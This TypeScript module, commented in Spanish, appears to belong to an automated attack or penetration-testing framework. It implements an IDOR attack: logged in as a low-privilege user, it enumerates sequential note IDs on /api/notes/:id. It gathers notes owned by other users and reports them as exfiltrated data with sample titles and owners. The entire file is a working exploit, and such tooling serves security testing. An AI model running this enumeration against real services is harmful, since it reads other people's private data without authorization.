/**
 * Ataque real: IDOR. getNote(id) no filtra por dueño, así que un usuario lee las
 * notas de cualquier otro enumerando IDs secuenciales. Leemos como un usuario
 * normal y detectamos notas cuyo user_id no es el nuestro.
 */
import { CATALOG } from '../catalog.ts';
import { reqLine } from '../../../core/http.ts';
import { lowPrivSession } from './session.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../../../core/types.ts';

const MAX_ID = 15;

export const idor: Attack = {
  meta: CATALOG['idor'],
  mutating: false, // solo lectura (enumeración)
  async run(ctx: AttackContext): Promise<AttackResult> {
    const steps: AttackStep[] = [];

    // Atacamos como un usuario de baja privilegia (credencial conocida).
    const s = await lowPrivSession(ctx);
    const token = s.token;
    const myId = s.id;

    const foreign: Array<{ id: number; user_id: number; title: string }> = [];
    for (let id = 1; id <= MAX_ID; id++) {
      const res = await ctx.http.get(`/api/notes/${id}`, { token });
      if (res.status !== 200) continue;
      const note = res.json as { id: number; user_id: number; title: string };
      const isForeign = note.user_id !== myId;
      if (isForeign) {
        foreign.push({ id: note.id, user_id: note.user_id, title: note.title });
        if (foreign.length <= 3) {
          steps.push({
            technique: 'Enumeración de IDs secuenciales (IDOR)',
            mitre: ['T1213'],
            request: reqLine('GET', `/api/notes/${id}`),
            response_summary: `HTTP 200 — nota de otro usuario (user_id=${note.user_id}): "${note.title}"`,
            exchange: res.exchange,
          });
        }
      }
    }

    const confirmed = foreign.length > 0;
    return {
      vuln_id: idor.meta.id,
      confirmed,
      blocked: false,
      steps,
      gained: confirmed ? [`lectura de ${foreign.length} notas ajenas sin autorización`] : [],
      foothold: confirmed ? { type: 'data', detail: `${foreign.length} notas de otros usuarios` } : undefined,
      data_exfiltrated: confirmed
        ? { table: 'notes', rows: foreign.length, sample: foreign.slice(0, 5).map((n) => ({ id: n.id, owner: n.user_id, title: n.title })) }
        : undefined,
      attacker_active: false,
      summary: confirmed
        ? `IDOR confirmado: enumerando /api/notes/:id se leyeron ${foreign.length} notas de otros usuarios (incluye datos sensibles).`
        : 'No se encontraron notas ajenas accesibles: el endpoint parece autorizar por dueño.',
    };
  },
};
